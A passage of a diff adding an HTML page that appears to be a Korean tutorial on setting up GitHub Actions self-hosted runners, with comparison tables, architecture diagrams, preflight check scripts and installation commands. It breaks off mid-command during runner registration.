+      <tr><td><strong>사내망 접근</strong></td><td>불가 (외부 IP에서 실행)</td><td><b>가능</b> — 내부 DB·레지스트리·K8s API 직접 호출</td></tr>
+      <tr><td><strong>하드웨어</strong></td><td>표준 스펙 (기본 2~4 vCPU)</td><td><b>자유</b> — GPU, 대용량 RAM, ARM, macOS 실기</td></tr>
+      <tr><td><strong>빌드 캐시</strong></td><td>매번 재다운로드 (Actions 캐시 의존)</td><td>로컬 디스크에 <b>Docker layer·node_modules 잔존</b> → 빠름</td></tr>
+      <tr><td><strong>비용 구조</strong></td><td>실행 <b>분 단위</b> 과금 (Public repo 무료)</td><td>Actions 사용료 <b>무료</b>, 대신 서버·전기·인건비</td></tr>
+      <tr><td><strong>OS 업데이트</strong></td><td>GitHub이 이미지 관리</td><td><b>내가</b> 패치·툴체인 관리</td></tr>
+      <tr><td><strong>보안 리스크</strong></td><td>낮음 (샌드박스 격리)</td><td>높음 — Public repo에 붙이면 <b>서버 탈취 위험</b></td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>이럴 때 Self-hosted를 씁니다</h3>
+  <div class="grid g2">
+    <div class="card"><div class="card-t">✅ 도입하기 좋은 경우</div>
+      <ul style="margin:0;font-size:14.6px;color:var(--text-2)">
+        <li>사내망 전용 자원(사내 Nexus/Harbor, 온프렘 K8s, 폐쇄망 DB)에 붙어야 함</li>
+        <li>GPU 학습·추론 테스트, 대용량 빌드(모노레포, C++, 안드로이드)</li>
+        <li>빌드 캐시 재사용으로 파이프라인 시간을 크게 줄이고 싶음</li>
+        <li>특수 하드웨어/OS(ARM 보드, macOS 실기, Windows 라이선스 툴)</li>
+        <li>월 Actions 사용 분(minutes)이 한도를 계속 초과함</li>
+      </ul></div>
+    <div class="card"><div class="card-t">🚫 도입을 미뤄야 하는 경우</div>
+      <ul style="margin:0;font-size:14.6px;color:var(--text-2)">
+        <li><b>Public(오픈소스) 리포지토리</b> — 외부인의 PR이 내 서버에서 실행됨</li>
+        <li>운영 담당자가 없어 방치될 예정(패치 안 된 러너는 취약점 덩어리)</li>
+        <li>단순 lint/유닛테스트만 돌리는 소규모 프로젝트</li>
+        <li>잡 간 격리가 반드시 필요한데 컨테이너/일회성 구성을 못 할 때</li>
+      </ul></div>
+  </div>
+
+  <div class="tip"><span class="cal-t">실무 팁</span>
+    둘은 배타적이지 않습니다. <b>혼합 전략</b>이 정석입니다 —
+    lint·유닛테스트는 <code>ubuntu-latest</code>로, 사내 배포·성능테스트만 <code>runs-on: [self-hosted, deploy]</code>로 분리하세요.
+  </div>
+</section>
+<!-- ============ 03 ============ -->
+<section id="s3">
+  <div class="sec-head"><div class="sec-num">03</div>
+    <div><h2>동작 원리: 왜 방화벽을 열지 않아도 되나</h2>
+    <div class="sec-sub">Long Polling — 러너가 GitHub에게 "일 있어요?"를 먼저 묻는다</div></div>
+  </div>
+
+  <p>
+    신입 엔지니어가 가장 많이 하는 오해가 <em>"GitHub이 우리 서버로 접속하니까 인바운드 포트를 열어야 한다"</em>는 것입니다.
+    <strong>정반대입니다.</strong> 러너 에이전트가 GitHub으로 <b>아웃바운드 HTTPS(443)</b> 연결을 먼저 맺고,
+    그 연결을 열어둔 채(long polling) 새 잡이 생길 때까지 기다립니다.
+  </p>
+
+  <figure>
+  <svg viewBox="0 0 860 300" role="img" aria-label="러너의 아웃바운드 통신 구조">
+    <defs>
+      <marker id="ao" markerWidth="10" markerHeight="10" refX="8" refY="3.2" orient="auto">
+        <path d="M0,0 L8,3.2 L0,6.4 z" fill="#34D3A6"/></marker>
+      <marker id="ax" markerWidth="10" markerHeight="10" refX="8" refY="3.2" orient="auto">
+        <path d="M0,0 L8,3.2 L0,6.4 z" fill="#F2617A"/></marker>
+    </defs>
+    <!-- 사내망 박스 -->
+    <rect x="12" y="24" width="330" height="256" rx="12" fill="#0C1218" stroke="#22303F" stroke-dasharray="6 4"/>
+    <text x="28" y="48" class="svg-s" fill="#6E7F93">사내망 / 사설 네트워크 (10.0.0.0/8)</text>
+    <rect x="34" y="70" width="130" height="76" rx="9" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
+    <text x="99" y="98" class="svg-t" text-anchor="middle" fill="#34D3A6">Runner</text>
+    <text x="99" y="118" class="svg-s" text-anchor="middle">10.0.3.21</text>
+    <text x="99" y="134" class="svg-s" text-anchor="middle">run.sh (에이전트)</text>
+    <rect x="192" y="70" width="128" height="76" rx="9" fill="#121A24" stroke="#22303F"/>
+    <text x="256" y="98" class="svg-t" text-anchor="middle">사내 자원</text>
+    <text x="256" y="118" class="svg-s" text-anchor="middle">Harbor / DB</text>
+    <text x="256" y="134" class="svg-s" text-anchor="middle">온프렘 K8s API</text>
+    <line x1="166" y1="108" x2="188" y2="108" stroke="#34D3A6" stroke-width="1.5" marker-end="url(#ao)"/>
+    <rect x="34" y="176" width="286" height="76" rx="9" fill="#0B111A" stroke="#22303F"/>
+    <text x="177" y="202" class="svg-l" text-anchor="middle">인바운드 오픈 포트: 없음 (0개)</text>
+    <text x="177" y="226" class="svg-s" text-anchor="middle">러너는 리스닝 소켓을 열지 않는다</text>
+    <text x="177" y="242" class="svg-s" text-anchor="middle">→ NAT 뒤, 사설 IP에서도 동작</text>
+    <!-- 방화벽 -->
+    <rect x="372" y="24" width="46" height="256" rx="8" fill="#141C26" stroke="#22303F"/>
+    <text x="395" y="160" class="svg-s" text-anchor="middle" transform="rotate(-90 395 160)">FIREWALL / PROXY</text>
+    <!-- 인터넷 -->
+    <rect x="452" y="52" width="396" height="196" rx="12" fill="#101825" stroke="#7C93F5" stroke-opacity=".4"/>
+    <text x="650" y="82" class="svg-t" text-anchor="middle" fill="#7C93F5">GitHub (인터넷)</text>
+    <rect x="476" y="102" width="164" height="30" rx="6" fill="#0B111A" stroke="#22303F"/>
+    <text x="558" y="122" class="svg-s" text-anchor="middle">github.com</text>
+    <rect x="660" y="102" width="164" height="30" rx="6" fill="#0B111A" stroke="#22303F"/>
+    <text x="742" y="122" class="svg-s" text-anchor="middle">api.github.com</text>
+    <rect x="476" y="142" width="164" height="30" rx="6" fill="#0B111A" stroke="#22303F"/>
+    <text x="558" y="162" class="svg-s" text-anchor="middle">*.actions.githubusercontent.com</text>
+    <rect x="660" y="142" width="164" height="30" rx="6" fill="#0B111A" stroke="#22303F"/>
+    <text x="742" y="162" class="svg-s" text-anchor="middle">*.pkg.github.com</text>
+    <rect x="476" y="182" width="348" height="42" rx="6" fill="#0B111A" stroke="#F5A524" stroke-opacity=".35"/>
+    <text x="650" y="200" class="svg-s" text-anchor="middle" fill="#F5A524">objects.githubusercontent.com (아티팩트/캐시)</text>
+    <text x="650" y="216" class="svg-s" text-anchor="middle">codeload.github.com · ghcr.io</text>
+    <!-- 화살표: 아웃바운드 허용 -->
+    <path d="M164 92 C300 92, 300 60, 448 92" fill="none" stroke="#34D3A6" stroke-width="2" marker-end="url(#ao)" class="flowline"/>
+    <text x="300" y="52" class="svg-l" text-anchor="middle" fill="#34D3A6">① 아웃바운드 HTTPS 443 (허용 필요)</text>
+    <!-- 화살표: 인바운드 차단 -->
+    <path d="M448 264 C300 264, 300 268, 172 264" fill="none" stroke="#F2617A" stroke-width="1.6" stroke-dasharray="4 4" marker-end="url(#ax)"/>
+    <text x="310" y="286" class="svg-l" text-anchor="middle" fill="#F2617A">② 인바운드 — 불필요 (열지 마세요)</text>
+  </svg>
+  <figcaption>핵심 — 러너는 <b>클라이언트</b>다. 아웃바운드 443만 허용하면 되고, 인바운드 방화벽 홀은 필요 없다. 프록시 환경이라면 <code>HTTPS_PROXY</code> 설정만 추가한다.</figcaption>
+  </figure>
+
+  <h3>잡이 러너에게 배정되는 순서</h3>
+  <ol>
+    <li><strong>등록(Registration)</strong> — <code>config.sh</code> 실행 시 등록 토큰으로 GitHub에 러너를 등록하고, 장기 인증 정보를 <code>.credentials</code>에 저장합니다.</li>
+    <li><strong>리스닝(Long Poll)</strong> — <code>run.sh</code>가 실행되면 GitHub에 "잡 주세요" 요청을 걸어두고 약 50초 단위로 재연결합니다. 상태는 <span class="kw-run">Idle</span>.</li>
+    <li><strong>라벨 매칭</strong> — 잡의 <code>runs-on</code> 라벨을 <b>모두 만족</b>하는 Idle 러너에게 GitHub이 잡을 할당합니다.</li>
+    <li><strong>실행</strong> — 러너는 <code>Runner.Worker</code> 프로세스를 띄워 스텝을 실행하고 로그를 실시간 업로드합니다. 상태는 <span class="kw-warn">Active</span>.</li>
+    <li><strong>정리 후 복귀</strong> — 잡 종료 후 워크스페이스를 남긴 채(기본값) 다시 Idle로 돌아가 다음 잡을 기다립니다.</li>
+  </ol>
+
+  <!-- ===== 시뮬레이터 ===== -->
+  <div class="demo" id="sim">
+    <div class="demo-h">
+      <div class="demo-t">🧪 러너 배정 시뮬레이터</div>
+      <span class="demo-tag">직접 조작해보기</span>
+    </div>
+    <p style="font-size:14.4px;color:var(--text-2);margin-bottom:16px">
+      잡을 큐에 넣고 러너가 어떻게 집어가는지 관찰하세요. <b>라벨이 하나라도 안 맞으면 잡은 영원히 Queued</b>에 남습니다 —
+      실무에서 "파이프라인이 안 돌아요" 문의의 절반이 이 상황입니다.
+    </p>
+    <div class="btn-row" style="margin-bottom:16px">
+      <button class="btn primary" onclick="simAdd('linux')">+ 잡 추가 [self-hosted, Linux]</button>
+      <button class="btn" onclick="simAdd('gpu')">+ 잡 추가 [self-hosted, gpu]</button>
+      <button class="btn" onclick="simAdd('win')">+ 잡 추가 [self-hosted, Windows]</button>
+      <button class="btn" onclick="simAdd('mac')">+ 잡 추가 [self-hosted, macOS] ⚠</button>
+      <button class="btn" onclick="simToggle(2)">🔌 Windows 러너 전원 토글</button>
+      <button class="btn" onclick="simReset()">↺ 초기화</button>
+    </div>
+    <div class="sim">
+      <div class="sim-col">
+        <div class="sim-col-t"><span>GitHub 측 · 잡 큐</span><span id="simQn">0 queued</span></div>
+        <div id="simJobs"><div style="font-family:var(--mono);font-size:11px;color:var(--muted);padding:14px 0;text-align:center">잡을 추가해 보세요</div></div>
+      </div>
+      <div class="sim-wall"><span class="wall-lbl">FIREWALL</span></div>
+      <div class="sim-col">
+        <div class="sim-col-t"><span>사내망 · 러너 풀</span><span id="simRn">3 runners</span></div>
+        <div id="simRunners"></div>
+      </div>
+    </div>
+    <div class="sim-log" id="simLog"></div>
+  </div>
+
+  <div class="warn"><span class="cal-t">기억할 규칙</span>
+    라벨 매칭은 <b>AND 조건</b>입니다. <code>runs-on: [self-hosted, Linux, gpu]</code>는
+    세 라벨을 <b>모두 가진</b> 러너만 받습니다. 라벨 오타 하나로 잡이 무한 대기하며,
+    GitHub은 에러를 띄우지 않고 그냥 기다립니다(기본 24시간 후 취소).
+  </div>
+</section>
+
+<!-- ============ 04 ============ -->
+<section id="s4">
+  <div class="sec-head"><div class="sec-num">04</div>
+    <div><h2>설치 전 준비물 점검</h2>
+    <div class="sec-sub">여기서 5분 확인하면 뒤에서 2시간을 아낍니다</div></div>
+  </div>
+
+  <h3>① 지원 환경과 최소 스펙</h3>
+  <div class="tw"><table>
+    <thead><tr><th>항목</th><th>권장 사양</th><th>메모</th></tr></thead>
+    <tbody>
+      <tr><td><strong>OS</strong></td><td>Ubuntu 22.04/24.04, RHEL/Rocky 8·9, Windows Server 2019+, macOS 12+</td><td>x64 및 ARM64 모두 지원</td></tr>
+      <tr><td><strong>CPU / RAM</strong></td><td>최소 2 vCPU / 7GB — 실사용은 4 vCPU / 8~16GB</td><td>Docker 빌드 시 RAM이 병목</td></tr>
+      <tr><td><strong>디스크</strong></td><td>100GB 이상 (SSD)</td><td>가장 흔한 장애 원인이 <b>디스크 풀</b></td></tr>
+      <tr><td><strong>네트워크</strong></td><td>아웃바운드 TCP 443 (github.com 등)</td><td>인바운드 개방 불필요</td></tr>
+      <tr><td><strong>실행 계정</strong></td><td>전용 일반 사용자 (예: <code>actions</code>)</td><td><b>root로 run.sh 실행 금지</b></td></tr>
+      <tr><td><strong>필수 패키지</strong></td><td><code>curl</code> <code>tar</code> <code>git(2.18+)</code> <code>sudo</code> + .NET 의존 라이브러리</td><td>RHEL 계열은 <code>libicu</code> 주의</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>② GitHub 권한 확인</h3>
+  <ul>
+    <li><b>Repository 러너</b> 등록 → 해당 리포지토리 <code>admin</code> 권한</li>
+    <li><b>Organization 러너</b> 등록 → Org <code>owner</code> 권한</li>
+    <li><b>Enterprise 러너</b> 등록 → Enterprise 관리자 권한</li>
+  </ul>
+
+  <h3>③ 사전 점검 스크립트</h3>
+  <p>설치 전에 아래를 그대로 붙여 실행하세요. 하나라도 <span class="kw-warn">FAIL</span>이면 그 문제부터 해결합니다.</p>
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">preflight.sh (Linux)</button>
+      <button class="tab" onclick="tab(this,1)">preflight.ps1 (Windows)</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+    <div class="pane active"><pre><span class="c-cm">#!/usr/bin/env bash</span>
+<span class="c-cm"># 러너 설치 전 환경 점검 — 실패 항목만 고치면 됩니다</span>
+<span class="c-kw">set</span> -u
+ok(){ <span class="c-kw">echo</span> -e <span class="c-st">"  \033[32mPASS\033[0m $1"</span>; }
+ng(){ <span class="c-kw">echo</span> -e <span class="c-st">"  \033[31mFAIL\033[0m $1"</span>; }
+
+<span class="c-kw">echo</span> <span class="c-st">"[1] OS / 아키텍처"</span>
+<span class="c-kw">echo</span> <span class="c-st">"  $(uname -srm)"</span>   <span class="c-cm"># aarch64면 ARM64 패키지를 받아야 함</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[2] 필수 명령어"</span>
+<span class="c-kw">for</span> c <span class="c-kw">in</span> curl tar git sudo; <span class="c-kw">do</span>
+  <span class="c-kw">command</span> -v <span class="c-st">"$c"</span> &gt;/dev/null &amp;&amp; ok <span class="c-st">"$c"</span> || ng <span class="c-st">"$c 없음 → 패키지 설치 필요"</span>
+<span class="c-kw">done</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[3] 디스크 여유 (30GB 이상 권장)"</span>
+avail=$(df -BG --output=avail /opt 2&gt;/dev/null | tail -1 | tr -dc <span class="c-st">'0-9'</span>)
+[ <span class="c-st">"${avail:-0}"</span> -ge <span class="c-nu">30</span> ] &amp;&amp; ok <span class="c-st">"${avail}GB 사용 가능"</span> || ng <span class="c-st">"여유 ${avail}GB — 부족"</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[4] GitHub 아웃바운드 443 연결"</span>
+<span class="c-kw">for</span> h <span class="c-kw">in</span> github.com api.github.com codeload.github.com \
+           objects.githubusercontent.com vstoken.actions.githubusercontent.com; <span class="c-kw">do</span>
+  code=$(curl -s -o /dev/null -w <span class="c-st">'%{http_code}'</span> --max-time <span class="c-nu">6</span> <span class="c-st">"https://$h"</span>)
+  [ <span class="c-st">"$code"</span> != <span class="c-st">"000"</span> ] &amp;&amp; ok <span class="c-st">"$h (HTTP $code)"</span> || ng <span class="c-st">"$h 차단 → 방화벽/프록시 확인"</span>
+<span class="c-kw">done</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[5] 시간 동기화 (틀어지면 토큰 인증 실패)"</span>
+timedatectl <span class="c-kw">show</span> -p NTPSynchronized --value <span class="c-nu">2</span>&gt;/dev/null | grep -q yes \
+  &amp;&amp; ok <span class="c-st">"NTP 동기화됨"</span> || ng <span class="c-st">"NTP 미동기화 → chrony/systemd-timesyncd 설정"</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[6] Docker (컨테이너 잡을 쓸 경우)"</span>
+<span class="c-kw">if</span> <span class="c-kw">command</span> -v docker &gt;/dev/null; <span class="c-kw">then</span>
+  docker info &gt;/dev/null <span class="c-nu">2</span>&gt;&amp;<span class="c-nu">1</span> &amp;&amp; ok <span class="c-st">"docker 사용 가능"</span> \
+    || ng <span class="c-st">"docker 권한 없음 → usermod -aG docker \$USER 후 재로그인"</span>
+<span class="c-kw">else</span> <span class="c-kw">echo</span> <span class="c-st">"  SKIP docker 미설치"</span>; <span class="c-kw">fi</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"[7] 전용 실행 계정 (root 실행 금지)"</span>
+[ <span class="c-st">"$(id -u)"</span> -ne <span class="c-nu">0</span> ] &amp;&amp; ok <span class="c-st">"현재 $(whoami)"</span> || ng <span class="c-st">"root — 일반 계정으로 전환하세요"</span></pre></div>
+    <div class="pane"><pre><span class="c-cm"># Windows PowerShell (관리자 아님, 일반 세션에서)</span>
+<span class="c-kw">Write-Host</span> <span class="c-st">"[1] OS"</span>; (Get-ComputerInfo).OsName
+
+<span class="c-kw">Write-Host</span> <span class="c-st">"[2] 디스크 여유"</span>
+Get-PSDrive C | Select-Object @{n=<span class="c-st">'FreeGB'</span>;e={[math]::Round($_.Free/<span class="c-nu">1GB</span>,<span class="c-nu">1</span>)}}
+
+<span class="c-kw">Write-Host</span> <span class="c-st">"[3] GitHub 연결"</span>
+<span class="c-st">'github.com'</span>,<span class="c-st">'api.github.com'</span>,<span class="c-st">'objects.githubusercontent.com'</span> | <span class="c-kw">ForEach-Object</span> {
+  $r = Test-NetConnection -ComputerName $_ -Port <span class="c-nu">443</span> -InformationLevel Quiet
+  <span class="c-st">"{0,-40} {1}"</span> -f $_, $(<span class="c-kw">if</span>($r){<span class="c-st">'PASS'</span>}<span class="c-kw">else</span>{<span class="c-st">'FAIL'</span>})
+}
+
+<span class="c-kw">Write-Host</span> <span class="c-st">"[4] 실행 정책 (스크립트 차단 여부)"</span>
+Get-ExecutionPolicy -List
+
+<span class="c-kw">Write-Host</span> <span class="c-st">"[5] 경로 길이 제한 해제 여부 (긴 경로 빌드 실패 예방)"</span>
+Get-ItemProperty <span class="c-st">'HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem'</span> -Name LongPathsEnabled</pre></div>
+  </div>
+
+  <div class="warn"><span class="cal-t">폐쇄망·프록시 환경 주의</span>
+    <code>Test-NetConnection</code>이나 curl이 막히면 설치 자체가 진행되지 않습니다.
+    보안팀에 요청할 도메인 목록을 <b>미리 정리</b>해 두세요:
+    <code>github.com</code>, <code>api.github.com</code>, <code>codeload.github.com</code>,
+    <code>*.actions.githubusercontent.com</code>, <code>objects.githubusercontent.com</code>,
+    <code>*.pkg.github.com</code>, <code>ghcr.io</code>.
+    최신 IP 대역은 <code>https://api.github.com/meta</code>의 <code>actions</code> 항목에서 확인합니다.
+  </div>
+</section>
+
+<!-- ============ 05 ============ -->
+<section id="s5">
+  <div class="sec-head"><div class="sec-num">05</div>
+    <div><h2>등록 범위 선택: Repository / Organization / Enterprise</h2>
+    <div class="sec-sub">잘못 고르면 나중에 러너를 전부 재등록해야 합니다</div></div>
+  </div>
+
+  <figure>
+  <svg viewBox="0 0 860 250" role="img" aria-label="러너 등록 범위 계층 비교">
+    <rect x="14" y="20" width="266" height="210" rx="11" fill="#0C1218" stroke="#22303F"/>
+    <text x="147" y="48" class="svg-t" text-anchor="middle">Repository 레벨</text>
+    <text x="147" y="68" class="svg-s" text-anchor="middle">가장 좁은 범위 · 학습용 최적</text>
+    <rect x="90" y="86" width="114" height="30" rx="6" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
+    <text x="147" y="106" class="svg-s" text-anchor="middle" fill="#34D3A6">runner-01</text>
+    <line x1="147" y1="116" x2="147" y2="142" stroke="#22303F"/>
+    <rect x="52" y="142" width="190" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="147" y="162" class="svg-s" text-anchor="middle">repo: web-frontend</text>
+    <text x="147" y="200" class="svg-s" text-anchor="middle" fill="#F2617A">다른 리포는 사용 불가</text>
+    <text x="147" y="216" class="svg-s" text-anchor="middle">리포 수만큼 러너 필요 → 낭비</text>
+
+    <rect x="296" y="20" width="266" height="210" rx="11" fill="#0C1218" stroke="#34D3A6" stroke-opacity=".45"/>
+    <text x="429" y="48" class="svg-t" text-anchor="middle" fill="#34D3A6">Organization 레벨 ★</text>
+    <text x="429" y="68" class="svg-s" text-anchor="middle">실무 표준 · 여러 리포가 공유</text>
+    <rect x="372" y="86" width="114" height="30" rx="6" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
+    <text x="429" y="106" class="svg-s" text-anchor="middle" fill="#34D3A6">runner-pool</text>
+    <line x1="429" y1="116" x2="429" y2="130" stroke="#22303F"/>
+    <line x1="340" y1="130" x2="518" y2="130" stroke="#22303F"/>
+    <line x1="340" y1="130" x2="340" y2="142" stroke="#22303F"/>
+    <line x1="429" y1="130" x2="429" y2="142" stroke="#22303F"/>
+    <line x1="518" y1="130" x2="518" y2="142" stroke="#22303F"/>
+    <rect x="308" y="142" width="64" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="340" y="162" class="svg-s" text-anchor="middle">api</text>
+    <rect x="397" y="142" width="64" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="429" y="162" class="svg-s" text-anchor="middle">web</text>
+    <rect x="486" y="142" width="64" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="518" y="162" class="svg-s" text-anchor="middle">infra</text>
+    <text x="429" y="200" class="svg-s" text-anchor="middle" fill="#34D3A6">Runner Group으로 접근 제어</text>
+    <text x="429" y="216" class="svg-s" text-anchor="middle">러너 1대를 팀 전체가 재사용</text>
+
+    <rect x="578" y="20" width="268" height="210" rx="11" fill="#0C1218" stroke="#22303F"/>
+    <text x="712" y="48" class="svg-t" text-anchor="middle">Enterprise 레벨</text>
+    <text x="712" y="68" class="svg-s" text-anchor="middle">여러 Org를 묶는 대기업 구성</text>
+    <rect x="655" y="86" width="114" height="30" rx="6" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
+    <text x="712" y="106" class="svg-s" text-anchor="middle" fill="#34D3A6">shared-pool</text>
+    <line x1="712" y1="116" x2="712" y2="130" stroke="#22303F"/>
+    <line x1="638" y1="130" x2="786" y2="130" stroke="#22303F"/>
+    <line x1="638" y1="130" x2="638" y2="142" stroke="#22303F"/>
+    <line x1="786" y1="130" x2="786" y2="142" stroke="#22303F"/>
+    <rect x="596" y="142" width="84" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="638" y="162" class="svg-s" text-anchor="middle">org-A</text>
+    <rect x="744" y="142" width="84" height="30" rx="6" fill="#121A24" stroke="#22303F"/>
+    <text x="786" y="162" class="svg-s" text-anchor="middle">org-B</text>
+    <text x="712" y="200" class="svg-s" text-anchor="middle">GHEC / GHES 환경</text>
+    <text x="712" y="216" class="svg-s" text-anchor="middle">중앙 플랫폼팀이 운영</text>
+  </svg>
+  <figcaption>선택 기준 — 혼자 학습이면 Repository, 팀 업무면 Organization(권장), 여러 조직을 아우르는 표준 파이프라인이면 Enterprise.</figcaption>
+  </figure>
+
+  <div class="tip"><span class="cal-t">추천</span>
+    처음 실습은 <b>개인 테스트 리포지토리</b>에 Repository 러너로 붙여 감을 잡고,
+    사내 도입 시에는 <b>Organization 러너 + Runner Group</b>으로 설계하세요.
+    등록 범위는 나중에 바꿀 수 없어서, 바꾸려면 <code>config.sh remove</code> 후 재등록해야 합니다.
+  </div>
+</section>
+<!-- ============ 06 ============ -->
+<section id="s6">
+  <div class="sec-head"><div class="sec-num">06</div>
+    <div><h2>설치 실습 — 10분 만에 첫 러너 띄우기</h2>
+    <div class="sec-sub">다운로드 → 등록(config) → 실행(run) 3단계</div></div>
+  </div>
+
+  <h3>STEP 1. 등록 토큰 발급</h3>
+  <p>GitHub 웹 화면에서 <b>일회용 등록 토큰</b>을 받아옵니다. 경로는 등록 범위에 따라 다릅니다.</p>
+  <div class="tw"><table>
+    <thead><tr><th>범위</th><th>메뉴 경로</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Repository</strong></td><td>리포지토리 → <b>Settings</b> → Actions → <b>Runners</b> → <b>New self-hosted runner</b></td></tr>
+      <tr><td><strong>Organization</strong></td><td>Org → <b>Settings</b> → Actions → <b>Runners</b> → <b>New runner</b></td></tr>
+      <tr><td><strong>Enterprise</strong></td><td>Enterprise → <b>Policies</b> → Actions → <b>Runners</b> → <b>New runner</b></td></tr>
+    </tbody>
+  </table></div>
+  <div class="danger"><span class="cal-t">토큰 취급 주의</span>
+    이 화면에 표시되는 토큰(<code>AXXXX...</code>)은 <b>1시간 후 만료</b>되는 등록 전용 토큰입니다.
+    Git에 커밋하거나 Slack에 붙여넣지 마세요. 자동화가 필요하면 토큰을 하드코딩하는 대신
+    <b>GitHub App</b> 또는 PAT로 <code>POST /repos/{owner}/{repo}/actions/runners/registration-token</code> API를 호출해 매번 새로 발급합니다.
+  </div>
+
+  <h3>STEP 2. 명령어 만들기 (자동 생성기)</h3>
+  <div class="demo">
+    <div class="demo-h">
+      <div class="demo-t">🛠 config 명령어 생성기</div>
+      <span class="demo-tag">값을 채우면 명령이 완성됩니다</span>
+    </div>
+    <div class="grid g2" style="margin:0 0 4px">
+      <div>
+        <div class="fld-wrap"><label class="fld" for="gScope">등록 범위</label>
+          <select id="gScope" onchange="gen()">
+            <option value="repo">Repository (리포지토리 1개 전용)</option>
+            <option value="org">Organization (조직 공용 · 권장)</option>
+            <option value="ent">Enterprise</option>
+          </select></div>
+        <div class="fld-wrap"><label class="fld" for="gOwner">Org 또는 사용자명</label>
+          <input type="text" id="gOwner" value="my-company" oninput="gen()"></div>
+        <div class="fld-wrap" id="gRepoWrap"><label class="fld" for="gRepo">리포지토리명</label>
+          <input type="text" id="gRepo" value="web-service" oninput="gen()"></div>
+        <div class="fld-wrap"><label class="fld" for="gOs">러너 OS / 아키텍처</label>
+          <select id="gOs" onchange="gen()">
+            <option value="linux-x64">Linux x64</option>
+            <option value="linux-arm64">Linux ARM64 (Graviton, DGX Spark 등)</option>
+            <option value="win-x64">Windows x64</option>
+            <option value="osx-arm64">macOS Apple Silicon</option>
+          </select></div>
+      </div>
+      <div>
+        <div class="fld-wrap"><label class="fld" for="gName">러너 이름 (호스트 식별용)</label>
+          <input type="text" id="gName" value="build-linux-01" oninput="gen()"></div>
+        <div class="fld-wrap"><label class="fld" for="gLabels">추가 라벨 (쉼표 구분)</label>
+          <input type="text" id="gLabels" value="docker,build" oninput="gen()"></div>
+        <div class="fld-wrap"><label class="fld" for="gGroup">Runner Group (Org 이상)</label>
+          <input type="text" id="gGroup" value="default" oninput="gen()"></div>
+        <div class="fld-wrap"><label class="fld">옵션</label>
+          <div style="display:flex;flex-direction:column;gap:7px;font-family:var(--mono);font-size:11.5px;color:var(--text-2)">
+            <label><input type="checkbox" id="gEph" onchange="gen()"> --ephemeral (잡 1개 처리 후 자동 해제 · 보안 권장)</label>
+            <label><input type="checkbox" id="gUnatt" checked onchange="gen()"> --unattended (질문 없이 자동 진행)</label>
+            <label><input type="checkbox" id="gRepl" onchange="gen()"> --replace (동일 이름 러너 덮어쓰기)</label>
+          </div></div>
+      </div>
+    </div>
+    <div class="code" style="margin-bottom:0">
+      <div class="code-bar"><div class="tabs">
+        <button class="tab active" onclick="tab(this,0)">등록 명령</button>
+        <button class="tab" onclick="tab(this,1)">워크플로우 runs-on</button>
+      </div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre id="genOut"></pre></div>
+      <div class="pane"><pre id="genYaml"></pre></div>
+    </div>
+  </div>
+
+  <h3>STEP 3. OS별 설치 실행</h3>
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">Linux (Ubuntu/Debian)</button>
+      <button class="tab" onclick="tab(this,1)">Linux (RHEL/Rocky)</button>
+      <button class="tab" onclick="tab(this,2)">Windows</button>
+      <button class="tab" onclick="tab(this,3)">macOS</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+
+    <div class="pane active"><pre><span class="c-cm"># ── 0) 러너 전용 계정 준비 (root로 1회만 실행) ─────────────</span>
+<span class="c-pr">$ </span>sudo useradd -m -s /bin/bash actions
+<span class="c-pr">$ </span>sudo mkdir -p /opt/actions-runner &amp;&amp; sudo chown actions:actions /opt/actions-runner
+<span class="c-pr">$ </span>sudo su - actions                <span class="c-cm"># 이후는 반드시 actions 계정으로</span>
+
+<span class="c-cm"># ── 1) 최신 러너 버전 확인 후 다운로드 ────────────────────</span>
+<span class="c-pr">$ </span><span class="c-kw">cd</span> /opt/actions-runner
+<span class="c-pr">$ </span>RUNNER_VERSION=$(curl -s https://api.github.com/repos/actions/runner/releases/latest \
+    | grep -oP <span class="c-st">'"tag_name": "v\K[^"]+'</span>)
+<span class="c-pr">$ </span><span class="c-kw">echo</span> <span class="c-st">"설치할 버전: $RUNNER_VERSION"</span>
+<span class="c-out">설치할 버전: 2.32x.x</span>
+
+<span class="c-pr">$ </span>curl -O -L <span class="c-st">"https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz"</span>
+<span class="c-pr">$ </span>tar xzf <span class="c-st">"actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz"</span>
+
+<span class="c-cm"># (권장) 무결성 검증 — GitHub 릴리스 페이지의 SHA256 값과 비교</span>
+<span class="c-pr">$ </span>sha256sum <span class="c-st">"actions-runner-linux-x64-${RUNNER_VERSION}.tar.gz"</span>
+
+<span class="c-cm"># ── 2) 시스템 의존 라이브러리 설치 (root 권한 필요) ────────</span>
+<span class="c-pr">$ </span>sudo ./bin/installdependencies.sh
+
+<span class="c-cm"># ── 3) 등록 (토큰은 GitHub 화면에서 복사한 값) ─────────────</span>
+<span class="c-pr">$ </span>./config.sh \
+    --url https://github.com/my-company/web-service \
+    --token AXXXXXXXXXXXXXXXXXXXXXXXXXX \
+    --name build-linux-01 \
+    --labels self-hosted,Linux,X64,docker,build \
+    --work _work \
